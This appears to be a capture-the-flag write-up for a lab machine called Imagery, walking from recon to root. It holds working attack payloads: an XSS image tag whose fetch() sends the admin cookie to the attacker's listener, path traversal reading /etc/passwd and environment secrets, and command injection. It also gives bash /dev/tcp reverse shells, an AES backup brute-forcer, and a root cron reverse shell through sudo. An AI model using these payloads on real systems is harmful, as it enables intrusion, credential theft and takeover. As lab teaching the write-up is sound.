## Enumeration

### Nmap

Start with classical nmap scans

```

| ssh-hostkey:
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The attack surface is minimal: SSH (likely the landing zone for lateral movement) and a Python/Werkzeug web application on port 8000. All focus goes to the web app.

### Bug Report — Stored XSS → Session Hijacking

Attempting various bypass techniques against the upload endpoint proves unfruitful at this stage. Pivoting to the **Bug Report** functionality reveals a far more interesting opportunity.

![Bug report form](/assets/img/posts/imagery/image-4.png)

Intercepting the request with Burp Suite we see the report content is submitted as-is.

![Burp intercept — bug report](/assets/img/posts/imagery/image-5.png)

The critical question is whether the admin who reviews bug reports has `HttpOnly` disabled on their session cookie. Looking at `app.py` later will confirm:

```python
app_core.config['SESSION_COOKIE_HTTPONLY'] = False
```

This means a classic XSS payload can exfiltrate the cookie. We inject a script that issues a GET request to our listener carrying `document.cookie`:

```html
<img src=x onerror=fetch('http://10.10.14.245:8000/?c='+document.cookie)>
```

![XSS payload injected via bug report](/assets/img/posts/imagery/image-6.png)

Within seconds, the admin bot visits the report and the cookie arrives on our HTTP server:

```
python3 -m http.server 8000
10.129.242.164 - - [26/Aug/2026 09:13:11] "GET /?c=session=.eJw9jbEOgz...5BD9YY HTTP/1.1" 200 -
```

We swap the session cookie in the browser via **DevTools → Storage → Cookies**, reload the page and land in the admin panel.

![Admin panel](/assets/img/posts/imagery/image-7.png)

## Initial Foothold

### Path Traversal — Source Code Disclosure

Inside **User Management** we find two accounts: `admin` and our test user.

![User management](/assets/img/posts/imagery/image-8.png)

The admin panel exposes a log-download endpoint parameterised by `log_identifier`. Testing for path traversal immediately succeeds:

```
GET /admin/get_system_log?log_identifier=../../../../../../etc/passwd
```

![/etc/passwd via path traversal](/assets/img/posts/imagery/image-12.png)

The passwd file reveals a user named `mark` — a lateral movement target to keep in mind. Reading SSH keys for `mark` yields nothing useful, but `/proc/self/environ` gives us far more:

![/proc/self/environ](/assets/img/posts/imagery/image-13.png)

```
LANG=en_US.UTF-8
PATH=/home/web/web/env/bin:/sbin:/usr/bin
USER=web
HOME=/home/web
CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p/runL!
```

The environment discloses that the app runs as user `web` from `/home/web/web/`. We can now pull the full Python source code using the same traversal. Based on the imports seen in `app.py`, we retrieve every module in a single loop:

```bash
mkdir src
for fn in "config" "utils" "api_auth" "api_upload" "api_manage" \
          "api_edit" "api_admin" "api_misc"; do
  curl --path-as-is \
    -b "session=<ADMIN_COOKIE>" \
    "http://imagery.htb:8000/admin/get_system_log?log_identifier=../${fn}.py" \
    -s > src/${fn}.py
done
```

```
src/
├── api_admin.py  ├── api_auth.py   ├── api_edit.py
├── api_manage.py ├── api_misc.py   ├── api_upload.py
├── config.py     └── utils.py
```

### Command Injection — Image Transform Endpoint

Logging in as `testuser` we revisit the image upload workflow. Uploading a valid image and following the path **Transform → Crop → Apply** reveals a crop-parameters endpoint:

![Image transformation UI](/assets/img/posts/imagery/image-17.png)
![Crop parameter form](/assets/img/posts/imagery/image-18.png)

Intercepting the request shows numeric geometry parameters `x`, `y`, `w`, `h` sent to the backend.

![Burp intercept — crop request](/assets/img/posts/imagery/image-19.png)

The `y` parameter is not sanitised. Confirming with a time-based payload:

```
y=0;sleep+5;
```

The response is delayed by exactly five seconds — a reliable blind command injection.

![Sleep payload confirmation](/assets/img/posts/imagery/image-20.png)

We weaponise it into a reverse shell:

```
y=0;bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261';
```

![Reverse shell payload](/assets/img/posts/imagery/image-21.png)

```
nc -lvnp 4444
connect to [10.10.14.245] from (UNKNOWN) [10.129.242.164] 37210
web@Imagery:~/web$ id
uid=1001(web) gid=1001(web) groups=1001(web)
```

Shell obtained as `web`.

## Privilege Escalation

### Lateral Movement: `web` → `mark`

#### AES-Encrypted Backup Brute-Force

A backup archive sits in `/var/backups`:

```
web@Imagery:/var/backup$ ls
web_20250806_120723.zip.aes
```

The file header confirms it was produced by **pyAesCrypt**:

```
xxd web_20250806_120723.zip.aes | head
00000000: 4145 5302 0000 1b43 5245 4154 4544 5f42  AES....CREATED_B
00000010: 5900 7079 4165 7343 7279 7074 2036 2e31  Y.pyAesCrypt 6.1
```

We exfiltrate the file and brute-force the AES passphrase against `rockyou.txt` using [pyAesBrute](https://github.com/wyn-cmd/pyAesBrute):

```python
import sys, pyAesCrypt, time

s = time.time()
b = 64 * 64
dic, fi, out = sys.argv[1], sys.argv[2], sys.argv[3]
pas = open(dic, 'rb').readlines()
n = 0
print('***brute forcing file...***')
while True:
    passf = pas[n].strip(b'\n')
    try:
        pyAesCrypt.decryptFile(fi, out, passf.decode('utf-8'), b)
        print(f'password: {{{passf.decode()}}}')
        print(f'time taken: {time.time() - s:.2f}s')
        sys.exit()
    except Exception:
        n += 1
```

```
python3 pybrute.py /usr/share/wordlists/rockyou.txt \
    web_20250806_120723.zip.aes web_20250806_120723.zip

***brute forcing file...***
  ***file decrypted***
password: {bestfriends}
time taken: 13.87s — 48.24 passwords/second
```

Extracting the ZIP reveals a `db.json` snapshot containing `mark`'s hashed password:

```json
{
  "username": "mark@imagery.htb",
  "password": "01c3d2e5bdaf6134cec0a367cf53e535"
}
```

CrackStation cracks it immediately:

![CrackStation — mark password](/assets/img/posts/imagery/image-23.png)

```
mark@imagery.htb : supersmash
```

```
web@Imagery:~/web$ su - mark
Password: 
mark@Imagery:~$ id
uid=1002(mark) gid=1002(mark) groups=1002(mark)
```

### Privilege Escalation: `mark` → `root`

#### Abusing `charcol` via Sudo

Checking `mark`'s sudo privileges:

```
mark@Imagery:~$ sudo -l
User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

`mark` can run `/usr/local/bin/charcol` as root without a password. Inspecting the tool:

```
sudo /usr/local/bin/charcol help

usage: charcol.py [--quiet] [-R] {shell,help} ...
Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}
    shell       Enter an interactive Charcol shell.
    help        Show help message.
```

Entering the interactive shell exposes an **automated job management** feature that writes directly to the system crontab:

```
Automated Jobs (Cron):
  auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>"
```

Because `charcol` runs as root via sudo, any cron job it registers will execute as root. We abuse this to install a reverse shell on a one-minute schedule:

```
mark@Imagery:~$ sudo charcol shell

charcol> auto add \
  --schedule "* * * * *" \
  --command "bash -c 'bash -i >& /dev/tcp/10.10.14.245/1337 0>&1'" \
  --name "0x4147"

[INFO] Application password verified.
[INFO] Auto job '0x4147' added successfully.
[INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true bash -c 'bash -i >& /dev/tcp/10.10.14.245/1337 0>&1'
```

We set up a listener and wait for the scheduler to fire:

```
nc -lvnp 1337
connect to [10.10.14.245] from (UNKNOWN) [10.129.242.164] 34430
root@Imagery:~# id
uid=0(root) gid=0(root) groups=0(root)
```
